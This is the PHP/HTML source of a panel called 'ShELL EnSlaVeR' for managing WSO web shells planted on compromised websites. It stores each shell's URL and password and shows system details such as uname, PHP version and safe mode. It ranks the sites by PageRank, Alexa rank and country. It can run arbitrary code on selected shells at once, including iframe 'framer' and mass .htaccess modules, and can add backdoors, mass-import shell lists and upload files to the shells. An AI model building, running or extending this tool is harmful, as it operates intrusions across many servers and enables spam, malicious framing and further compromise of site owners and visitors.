<?php
include 'init.php';
?>
<html>
<head>
	<meta http-equiv='Content-Type' content='text/html; charset=UTF-8'>
	<title>~ShELL EnSlaVeR~</title>
	<!-- jQuery -->
	<script src="js/jq.js" type="text/javascript"></script>
  
    <!-- jQuery UI -->
	<script src="js/jquery-ui-1.8.23.custom.min.js"></script>
    <link rel="stylesheet" href="css/ui-darkness/jquery-ui-1.8.23.custom.css" type="text/css"/>
	
    <!--Up&Down -->
    <script src="js/updownPhonedevelop.js"></script>

	<!-- Tablesorter: required -->
	<link rel="stylesheet" href="css/theme.blue.css">
	<link rel="stylesheet" href="js/jquery.qtip.min.css">
	<script src="js/jquery.tablesorter.js"></script>

	<!-- Tablesorter: optional -->
	<link rel='stylesheet' href='index.css' type='text/css' />
	<script src="js/jquery.tablesorter.pager.js"></script>
	<script src="js/jquery.tablesorter.widgets.js"></script>
	
	<!-- Qtip -->
	<script src="js/jquery.qtip-1.0.0-rc3.js"></script>
	
	<!-- Jqplot -->
	<link rel="stylesheet" type="text/css" href="js/jquery.jqplot.min.css" />
	<script src="js/jquery.jqplot.min.js"></script>
    <script src="js/jqplot.pieRenderer.min.js"></script>

	<script>
	//Jqplot#1
	$(document).ready(function(){
    jQuery.jqplot.config.enablePlugins = true;
    plot7 = jQuery.jqplot('chart7', 
    <?=dzConvert($database)?>, 
    {
      title: '<b>Domain Zones</b> ', 
      seriesDefaults: {shadow: true, renderer: jQuery.jqplot.PieRenderer, rendererOptions: { showDataLabels: true } }, 
      legend: { show:true }
    }
    );
         
    var plot8 = $.jqplot('chart8', <?=arConvert($database)?>, {
	    title: '<b>Alexa Rank</b> ', 
        grid: {
            drawBorder: false,
            drawGridlines: false,
            background: '#FFF',
            shadow:false
        },
        axesDefaults: {
             
        },
        seriesDefaults:{
            renderer:$.jqplot.PieRenderer,
            rendererOptions: {
                showDataLabels: true
            }
        },
        legend: {
            show: true,
            rendererOptions: {
                numberRows: 1
            },
            location: 's'
        }
    });
	
  /*var plot3 = $.jqplot('chart8', [14, 32, 41, 44, 40], {
    title: 'Bar Chart with Point Labels',
    seriesDefaults: {renderer: $.jqplot.BarRenderer},
    series:[
     {pointLabels:{
        show: true,
        labels:['fourteen', 'thirty two', 'fourty one', 'fourty four', 'fourty']
      }}],
    axes: {
      xaxis:{renderer:$.jqplot.CategoryAxisRenderer},
      yaxis:{padMax:1.3}}
  });*/
	
	$('#graphs2').hide();
      });
</script>

<script id="js">$(function(){

	// define pager options
	var pagerOptions = {
		// target the pager markup - see the HTML block below
		container: $(".pager"),
		// output string - default is '{page}/{totalPages}'; possible variables: {page}, {totalPages}, {startRow}, {endRow} and {totalRows}
		output: '{startRow} - {endRow} / {filteredRows} ({totalRows})',
		// if true, the table will remain the same height no matter how many records are displayed. The space is made up by an empty
		// table row set to a height to compensate; default is false
		fixedHeight: true,
		
		// remove rows from the table to speed up the sort of large tables.
		// setting this to false, only hides the non-visible rows; needed if you plan to add/remove rows with the pager enabled.
		removeRows: false,
		// go to page selector - select dropdown that sets the current page
		cssGoto:	 '.gotoPage'
	};

	// Initialize tablesorter
	// ***********************
	$.tablesorter.defaults.sortList = [[2,1]];
	$(".tablesorter")
		.tablesorter({
			theme: 'blue',
			headers: { 
            0: { 
              
                sorter: false 
            } 
        },
			headerTemplate : '{content} {icon}', // new in v2.7. Needed to add the bootstrap icon!
			widthFixed: true,
			widgets: ['zebra', 'filter','stickyHeaders'],
			widgetOptions : {
            // css class name applied to the sticky header row (tr)
			stickyHeaders : 'tablesorter-stickyHeader',

			// If there are child rows in the table (rows with class name from "cssChildRow" option)
			// and this option is true and a match is found anywhere in the child row, then it will make that row
			// visible; default is false
			filter_childRows : false,

			// if true, a filter will be added to the top of each table column;
			// disabled by using -> headers: { 1: { filter: false } } OR add class="filter-false"
			// if you set this to false, make sure you perform a search using the second method below
			filter_columnFilters : true,

			// css class applied to the table row containing the filters & the inputs within that row
			filter_cssFilter : 'tablesorter-filter',

			// add custom filter functions using this option
			// see the filter widget custom demo for more specifics on how to use this option
			filter_functions : null,

			// if true, filters are collapsed initially, but can be revealed by hovering over the grey bar immediately
			// below the header row. Additionally, tabbing through the document will open the filter row when an input gets focus
			filter_hideFilters : true,

			// Set this option to false to make the searches case sensitive
			filter_ignoreCase : true,

			// jQuery selector string of an element used to reset the filters
			filter_reset : 'a.reset',

			// Delay in milliseconds before the filter widget starts searching; This option prevents searching for
			// every character while typing and should make searching large tables faster.
			filter_searchDelay : 300,

			// Set this option to true to use the filter to find text from the start of the column
			// So typing in "a" will find "albert" but not "frank", both have a's; default is false
			filter_startsWith : false,

			// Filter using parsed content for ALL columns
			// be careful on using this on date columns as the date is parsed and stored as time in seconds
			filter_useParsedData : false

		}
		})

		// initialize the pager plugin
		// ****************************
		.tablesorterPager(pagerOptions);

		// Add two new rows using the "addRows" method
		// the "update" method doesn't work here because not all rows are
		// present in the table when the pager is applied ("removeRows" is false)
		// ***********************************************************************
		var r, $row, num = 50,
			row = '<tr><td>Student{i}</td><td>{m}</td><td>{g}</td><td>{r}</td><td>{r}</td><td>{r}</td><td>{r}</td><td><button class="remove" title="Remove this row">X</button></td></tr>' +
				'<tr><td>Student{j}</td><td>{m}</td><td>{g}</td><td>{r}</td><td>{r}</td><td>{r}</td><td>{r}</td><td><button class="remove" title="Remove this row">X</button></td></tr>';
		$('button:contains(Add)').click(function(){
			// add two rows of random data!
			r = row.replace(/\{[gijmr]\}/g, function(m){
				return {
					'{i}' : num + 1,
					'{j}' : num + 2,
					'{r}' : Math.round(Math.random() * 100),
					'{g}' : Math.random() > 0.5 ? 'male' : 'female',
					'{m}' : Math.random() > 0.5 ? 'Mathematics' : 'Languages'
				}[m];
			});
			num = num + 2;
			$row = $(r);
			$('table')
				.find('tbody').append($row)
				.trigger('addRows', [$row]);
		});

		// Delete a row
		// *************
		$('table').delegate('button.remove', 'click' ,function(){
			var t = $('table');
			// disabling the pager will restore all table rows
			t.trigger('disable.pager');
			// remove chosen row
			$(this).closest('tr').remove();
			// restore pager
			t.trigger('enable.pager');
		});

		// Destroy pager / Restore pager
		// **************
		$('button:contains(Destroy)').click(function(){
			// Exterminate, annhilate, destroy! http://www.youtube.com/watch?v=LOqn8FxuyFs
			var $t = $(this);
			if (/Destroy/.test( $t.text() )){
				$('table').trigger('destroy.pager');
				$t.text('Restore Pager');
			} else {
				$('table').tablesorterPager(pagerOptions);
				$t.text('Destroy Pager');
			}
		});

		// Disable / Enable
		// **************
		$('.toggle').click(function(){
			var mode = /Disable/.test( $(this).text() );
			$('table').trigger( (mode ? 'disable' : 'enable') + '.pager');
			$(this).text( (mode ? 'Enable' : 'Disable') + 'Pager');
		});
		$('table').bind('pagerChange', function(){
			// pager automatically enables when table is sorted.
			$('.toggle').text('Disable');
		});

});
	function ll(){
	$("#lol").slideToggle(300);
	}
	

function fff(par){
if($(this).attr("checked"))
{$("#taCode").load(par);}
else{$("#taCode").empty();}
 }

		function tooltips(targets, name){
			$(targets).each(function(i){
				$("body").append("<div class='"+name+"' id='"+name+i+"'>"+$(this).attr('title')+"</div>");
				var my_tooltip = $("#"+name+i);

				$(this).removeAttr("title")
						.mouseover( function(){my_tooltip.css({display:"none"}).show();} )
						.mousemove(	function(kmouse){my_tooltip.css({left:kmouse.pageX+10, top:kmouse.pageY+10});} )
						.mouseout( function(){my_tooltip.hide();} );
			});
		}
		
		
		
				
	
function sa(){
            if($('#selectz').attr('checked')){
                $('input:checkbox:visible').attr('checked', true);
            } else {
                $('input:checkbox:visible').attr('checked', false);
            }
}
	
function sa2(){
            if($('#sall').attr('checked')){
                $('input:checkbox').attr('checked', true);
            } else {
                $('input:checkbox').attr('checked', false);
            }
}

	
	
		function delete_shells() {
			if(confirm('Are you sure?')) {
				document.sf.elements['do'].value = "delete";
				document.sf.submit();
			}
		}
		$(document).ready(function(){
		
		$('.my-input').each(function(){
      $(this).qtip({
         content: $(this).attr("value"),
         show: 'focus',
         hide: 'blur',
		 style: { name: 'dark' }
      });
   });
		
		
		tooltips(".shells","tooltip");
		$("#checker").click(function(){
		
		if(confirm('Really Check Shells?')) {
				
			
   checkBoxs = [];
   $("input:checkbox:checked").each(function() {checkBoxs.push($(this).val());});
   $.ajax({url:'checker.php',
         type:'POST',	
         data:'id='+checkBoxs.join(), 
		 beforeSend:function(){
        $(".ajaxLoader").show();
        },
         success:function(result){
            $('#checkresult').html(result);
			$(".ajaxLoader").hide();
			}
      });
			}
		
		});
		
		//Modules Ajax
$("#m").click(function(){
if($(this).attr("checked"))
{$("#taCode").load('modules/framer.txt');}
else{$("#taCode").empty();}
});
		
$("#m1").click(function(){
if($(this).attr("checked"))
{$("#taCode").load('modules/htacess.txt');}
else{$("#taCode").empty();}
});

$("#m2").click(function(){
if($(this).attr("checked"))
{$("#taCode").load('modules/domain_searcher.txt');}
else{$("#taCode").empty();}
});




	   //Css and Ajax Comment form
	   $(".my-input").click(function(){
       $(this).css({"margin":"2",
	"color":"white",
	"background-color":"#555",
	"border":"1px solid #df5",
	"font": "9pt Monospace,'Courier New'"});
   });
	$(".my-input").mouseout(function(){
       $(this).css({"border":"black 1px",
    "font":"9pt Monospace,'Courier New'",
    "color":"white",
    "width":"80%"});
   });
	
		
		
		$('#uploadfile1').click(function(){$("#uploadfile2").slideToggle(300)});
		$('#graphs1').click(function(){$("#graphs2").slideToggle(300)});
		$('#obfuscator1').click(function(){$("#obfuscator2").slideToggle(300)});
		$('#uploadfile').click(function(){$("#divFileupload").slideToggle(300)});
		$('#stattable1').click(function(){$("#stattable").slideToggle(300)});
		$('#nn').click(function(){$("#divExec").slideToggle(300)});
	    $('#logoutDiv').css({left:document.body.clientWidth-75});
		$("th").css("color","red");
		
		$("#all").click(function() { 
    $('#lolzz').empty();
    $.get("zone.php", function(html) { 
      
      // append the "ajax'd" data to the table body 
      $(".main2 tbody").append(html); 
 
      // let the plugin know that we made a update 
      // the resort flag set to anything BUT false (no quotes) will trigger an automatic 
      // table resort using the current sort 
      var resort = true; 
	  
      $(".main2").trigger("update", [resort]); 
 
      // triggering the "update" function will resort the table using the current sort; since version 2.0.14 
      // use the following code to change the sort; set sorting column and direction, this will sort on the first and third column 
      // var sorting = [[2,1],[0,0]]; 
      // $("table").trigger("sorton", [sorting]); 
    }); 
 
    return false; 
  });
		
		});
function commentSave(id){
var content=$('#'+id).val();
$.ajax({url:'commentsave.php',
         type:'POST',	
         data:'id='+id+'&content='+content, 
         beforeSend:function(){
        $(".ajaxLoader").show();
        },		 
         success:function(result){
            $('#ajax').html(result);
			$(".ajaxLoader").hide();
			
			}
      });
}
	
			
function save(){
    key=prompt('Filename', '');
    checkBoxs = [];
    $("input:checkbox:checked").each(function() {checkBoxs.push($(this).val());});
    $.ajax({url:'save.php',
         type:'POST',	
         data:'do=save&id='+checkBoxs.join()+'&key='+key, 
         success:function(result){$('#checkresult').html(result);}
		 
		 
      });


}

     
function exec(){
   checkBoxs = [];
   $("input:checkbox:checked").each(function() {checkBoxs.push($(this).val());});
   code=encodeURIComponent($('#taCode').val());
   $.ajax({url:'exer.php',
         type:'POST',	
         data:'do=exec&code='+code+'&id='+checkBoxs.join(),
         beforeSend:function(){
        $(".ajaxLoader").show();
        },		 
         success:function(result){
            $('#ajax').html(result);
			$(".ajaxLoader").hide();
			
			}
      });
}

function withoutPass(action,pass){
    var form = document.nopass;
    form.action = action;
	form.children[0].value = pass;
    form.submit();
    }


function addBackdoor(id,url){
    document.getElementById('dialog1').children[0].innerHTML = url;
    $("#dialog1").dialog({modal:true,buttons:{
    OK:function(){
    $(this).dialog("close");
    var bdurl = $('#bdinput').val();
	
	$.ajax({url:'addbackdoor.php',
         type:'POST',	
         data:'bdurl='+bdurl+'&id='+id,
         beforeSend:function(){
        $(".ajaxLoader").show();
        },		 
         success:function(result){
            $('#ajax').html(result);
			$(".ajaxLoader").hide();
			//location.reload();
			}
      });
	
    }}});
   
            
	}
	
	
	
	
function uploadSubmit(){
    document.sf.target = "_blank";
	document.sf.action = "uploadfile.php";
	document.sf.submit();
	document.sf.target = "_self";
    document.sf.action = "";	
    }
   	
</script>


	
</head>
<body>
	<center><div style="width:740px;">
	<div id='ajax'></div>
	
</head>
<body>
	<div id="logoutDiv" class="content" style="position:absolute;width:50px;text-align:center;"><a href="login.php?do=logout">Logout</a></div>
	<center><div style="width:740px;">
	<div id='ajax'></div>
<?php

//Add
if(($_POST['do']=="add") && !empty($_POST['url']) && isset($_POST['password'])) {
        $urlit=parse_url($_POST['url']);
		$postdata = http_build_query(
			array(
				'pass' => $_POST['password'],
				'a' => 'RC'
			)
		);
		//Duplicate Check
		$is=false;
		foreach($database as $id=>$arr){
		    if(stristr($database[$id]['url'],$urlit['host'])){exit($urlit['host'].'&nbsp already exists<br>');}
		    }
		
		
		$result = get_content($_POST['url'], $postdata);
		
		
		if($result){
			$item = @unserialize($result);
			//Check Valid
		    if(CHECK_BEFORE){
			   if(!is_array($item) || !isset($item['wso_version'])){
		          exit($urlit['host'].'&nbsp Isnt Valid');
		          }
			   }
			switch(MODE){
			   case 'FULL':
			      $item['pr']=getpr('http://'.$urlit['host']);
			      $item['dmoz']=getdmoz('http://'.$urlit['host']);
			      $item['country']=getCountry($urlit['host']);
			      $item['backdoor']=$_POST['backdoor'];
			      $item['alexa']=getAlexaRank('http://'.$urlit['host']);
			      break;
			   case 'FRAMING':
			      $item['backdoor']=$_POST['backdoor'];
			      $item['alexa']=getAlexaRank('http://'.$urlit['host']);
			      break;
			   case 'FRAMING_ADVANCE':
			      $item['country']=getCountry($urlit['host']);
			      $item['backdoor']=$_POST['backdoor'];
			      $item['alexa']=getAlexaRank('http://'.$urlit['host']);
			      break;
			   case 'SEO':
			      $item['pr']=getpr('http://'.$urlit['host']);
			      $item['dmoz']=getdmoz('http://'.$urlit['host']);
			      $item['country']=getCountry($urlit['host']);
			      $item['backdoor']=$_POST['backdoor'];
			      break;
			   }
	
		$item = array_merge($item, array(
			'url' => $_POST['url'],
			'pass' => $_POST['password']
		));
		$database[] = $item;
		save_db();
		page_reload();
		}else{
		exit('Sorry,Cant Get Content');
		}
		
	}
	
	//Delete
	elseif(($_POST['do']=="delete") && isset($_POST['id']) && is_array($_POST['id'])) {
		foreach($_POST['id'] as $id)
			if(isset($database[$id]))
				unset($database[$id]);
		save_db();
		page_reload();
		
		
	}
	
	//Mass Add
	elseif (is_uploaded_file($_FILES['uploadfile']['tmp_name'])){
$uploaddir = './temp/';
$uploadfile = $uploaddir.basename($_FILES['uploadfile']['name']);

move_uploaded_file($_FILES['uploadfile']['tmp_name'], $uploadfile);

$m1=file($uploadfile);
$m=array();
foreach($m1 as $k=>$v){
$m[$k]=explode('|',rtrim($v));
$urlit=parse_url($m[$k][0]);
$postdata = http_build_query(
			array(
				'pass' =>$m[$k][1],
				'a' => 'RC'
			)
		);
		//Duplicate Check
		$is=false;
		foreach($database as $id=>$arr){
		    if(stristr($database[$id]['url'],$urlit['host'])){echo $urlit['host'].'&nbsp already exists<br>';$is=true;break;}
		    }
		if($is){continue;}
		
		
		$result = get_content($m[$k][0], $postdata);
		
		if($result){
			$item = @unserialize($result);
			//Check Valid
		    if(CHECK_BEFORE){
			   if(!is_array($item) || !isset($item['wso_version'])){
		          continue;
		          }
			   }
			
			switch(MODE){
			   case 'FULL':
			      $item['pr']=getpr('http://'.$urlit['host']);
			      $item['dmoz']=getdmoz('http://'.$urlit['host']);
			      $item['country']=getCountry($urlit['host']);
			      $item['backdoor']='';
			      $item['alexa']=getAlexaRank('http://'.$urlit['host']);
			      break;
			   case 'FRAMING':
			      $item['backdoor']='';
			      $item['alexa']=getAlexaRank('http://'.$urlit['host']);
			      break;
			   case 'FRAMING_ADVANCE':
			      $item['country']=getCountry($urlit['host']);
			      $item['backdoor']='';
			      $item['alexa']=getAlexaRank('http://'.$urlit['host']);
			      break;
			   case 'SEO':
			      $item['pr']=getpr('http://'.$urlit['host']);
			      $item['dmoz']=getdmoz('http://'.$urlit['host']);
			      $item['country']=getCountry($urlit['host']);
			      $item['backdoor']='';
			      break;
			   }
			   
		
		$item = array_merge($item, array(
			'url' =>$m[$k][0],
			'pass' =>$m[$k][1]
		    ));
		$database[] = $item;
		save_db();
		#page_reload();
		}
		
		
}
page_reload();
}








if(is_array($database) && count($database)) {
echo '<br/><h1> <a href=# class=reset title=refresh>Shells list</a>&nbsp['.count($database).']</h1><div class=content><div class="pager">
		Page: <select class="gotoPage"></select>
		<img src="img/first.png" class="first" alt="First" title="First page" />
		<img src="img/prev.png" class="prev" alt="Prev" title="Previous page" />
		<span class="pagedisplay"></span> <!-- this can be any element, including an input -->
		<img src="img/next.png" class="next" alt="Next" title="Next page" />
		<img src="img/last.png" class="last" alt="Last" title= "Last page" />
		<select class="pagesize">
			<option selected="selected" value="10">10</option>
			<option value="20">20</option>
			<option value="30">30</option>
			<option value="50">50</option>
			<option value="100">100</option>
			<option value="500">500</option>
			<option value="1000">1000</option>
			<option value="5000">5000</option>
		</select>
		ALL--><input title="select all checkboxes including hidden" id="sall" type="checkbox" onclick="sa2()">
	</div><form method="post" name="sf" enctype="multipart/form-data">';
echo '<table class="tablesorter" width="100%" cellspacing=0 cellpadding=2>';
			echo '<thead><tr><th width="1%"><input type="checkbox" id="selectz" onclick="sa()" ></th><th width="20%">WebSite</th><th width="20%">PR</th><th width="20%">Country</th><th width=20%>DMOZ</th><th>Alexa</th><th>Valid</th><th>Comment</th><th class="remove sorter-false"></th></tr></thead><tbody>';

	$l = 0;
	
	
	foreach($database as $id => $item) {
		$info = "";
		if(!empty($item['pass']))
			$info .= "<b><u><center>SYSTEM INFO</center></u></b><br><b>Password: </b>".htmlspecialchars($item['pass'])."<br/>";
		if(isset($item['uname']))
			$info .= "<b>Uname: </b>".htmlspecialchars($item['uname'])."<br/>";
		if(isset($item['php_version']))
			$info .= "<b>PHP: </b>".htmlspecialchars($item['php_version'])."<br/>";
		if(isset($item['wso_version']))
			$info .= "<b>WSO: </b>".htmlspecialchars($item['wso_version'])."<br/>";
		if(isset($item['safemode']))
			$info .= "<b>Safe Mode: </b>".($item['safemode']?"<font color=red><b>ON</b></font>":"<font color=green><b>OFF</b></font>")."<br/>";
			$urlit2=parse_url($item['url']);
			
			
		echo '<tr><td width="1%"><input type="checkbox"  name="id[]" value="'.$id.'"/></td><td width="20%"><a class="shells" title="'.$info.'" href="#"  onclick=withoutPass("'.$item['url'].'","'.$item['pass'].'")>'.htmlspecialchars($urlit2['host']).'</a>&nbsp&nbsp&nbsp<a href="'.$item['backdoor'].'" title="Go To Backdoor" target="blank"><font color=black>B</font></a> <a href="#" title="Add Backdoor" onclick=addBackdoor('.$id.',"'.$urlit2['host'].'")><font color=black>+</font></a></td><td>'.$item['pr'].'</td><td>'.$item['country'].'</td><td>'.$item['dmoz'].'</td><td>'.$item['alexa'].'</td><td>'.$item['valid'].'</td><td><input class="my-input" type="text" id="'.$id.'" value="'.$item['comment'].'"><a href="#" title="save comment" onclick="commentSave('.$id.');">*</a></td><td><button class="remove" title="Remove this row">X</button></td></tr>';
				
		$l = $l?0:1;
	}
?>

</tbody></table>
	<input type="hidden" name="do" value="">
	<input id="nn" type="button" value="Exec" >
	<input type="button" value="Delete" onclick="delete_shells()">
	<input id="saveas" type="button" value="Save" onclick="save()">
	<input id="graphs1" type="button" value="Graphs">
	<input id="uploadfile1" type="button" value="UploadFile">
	<input id="checker" type="button" value="CheckValid">

	<div id="checkresult"></div>
	<div class="ajaxLoader" style="display:none"><img src="img/progress_bar.gif"></div>
	
	

	<div id="divExec" style="display:none;" class="hid">
	<u><b title="Framing\Links">Framer</b></u>
		<input id="m" type="checkbox">
	<u><b title="Mass .Htaccess Editor">Htaccess</b></u>
		<input id="m1" type="checkbox">
		<u><b title="Search All Domains">Domain Searcher</b></u>
		<input id="m2" type="checkbox">
		<br>
		<span>Code:</span>
		<textarea name="code" id="taCode" style="width:100%;height:200px;"></textarea><br/>
		<input type="button" value=">>" onclick="exec();">
	</div>	


	
<!-- Graphs Div -->
<div id="graphs2" class="hid">
    <div id="chart8" style="margin-top:20px; margin-left:20px; width:460px; height:300px;"></div>
    <div id="chart7" style="margin-top:20px; margin-left:20px; width:460px; height:300px;"></div>
</div>	

<!-- Jq UI Dialog Widget Div -->
<div id="dialog1" title="Add Backdoor/Additional Shell" style="display:none">
<b>google.com:</b><br>
<input id="bdinput" type="text">
</div>

<!-- UploadFile Div -->	
<div id="uploadfile2"  style="display:none">
<input type="file" name="uploadfiletoshell"></td>
<td><input type="button" value="upload" onclick="uploadSubmit()"></td>
</div>


</form>

	


	
<?php
}
?>


<h1>Add shell</h1><div class=content>
		<form method="post">
			<input type="hidden" name="do" value="add"/>
			<table width="100%" cellpadding="0" cellspacing="0">
				<tr>
					<td width="1%">URL:</td>
					<td><input type="text" name="url" value="http://" class="largeInput"/></td>
				</tr>
				<tr>
					<td>Password:</td>
					<td><input type="text" name="password" class="largeInput"/></td>
				</tr>
				<tr>
					<td>Backdoor:</td>
					<td><input type="text" name="backdoor" value="http://" class="largeInput"/></td>
				</tr>
				<tr>
				<tr>
				    <td></td>
					<td><input type="submit" value="add"/></td>
				</tr>
			</table>
		</form>
			

<!--Go to The Shell Without Pass-->
<form  style = "display:none" action="" name="nopass" method="post" target="_blank">
<input type="password" name="pass" value="">
<input type=submit value='>>'>
</form>
		
		
 <form  method=post enctype=multipart/form-data>
 <table width="100%" cellpadding="0" cellspacing="0">
 <tr>
 <td width="9.5%">Mass Add:</td>
 <td><input type=file name=uploadfile></td>
 </tr>
 <tr>
 <td></td>
 <td><input type=submit value=add></td>
 </tr>
 </form>
 </table>
	</div>

</div>

</center>

</body>
</html>
